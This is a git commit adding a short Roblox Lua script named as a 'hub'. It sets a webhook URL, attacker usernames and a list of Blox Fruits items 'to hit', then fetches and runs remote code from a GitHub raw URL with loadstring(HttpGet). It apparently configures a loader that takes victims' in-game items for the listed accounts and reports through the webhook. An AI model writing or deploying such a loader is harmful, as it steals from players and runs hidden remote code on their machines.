70750ec530233fdf76cfc6c327089ea4e6cc3f19
redzhub <batistajp150@gmail.com>
2025-04-04 18:49:09 -0400

    Create gigihub.lua

---
+++ gigihub.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=N1F6RU5ua3JmSC1KVWd4ZEphRFpEZzpiUHBlXzUxdDdKVVRNT3ptTG1LdzdVdVZ0amd4NWFma2hRZmFTTy1iNTJaZndjSmhPYWNqMTYxOU96OXMwUWFnMnJMeGJQX2NkV18tU0RLb0Vlb2JyazBLY1FyVklKZ1dyZU5uWElwOFpLVFo4S1pZX2dGVFhHMTdIak5kRXFpQkY1MDlqUHZPMmtFQkZXYURWS2hzSFJNNkp3U0luUG5KajNHaFpKTTRPNFU" -- << Your Webhook
+Usernames = {"jsjsjdjxdjjshaja", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dragon-Dragon"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
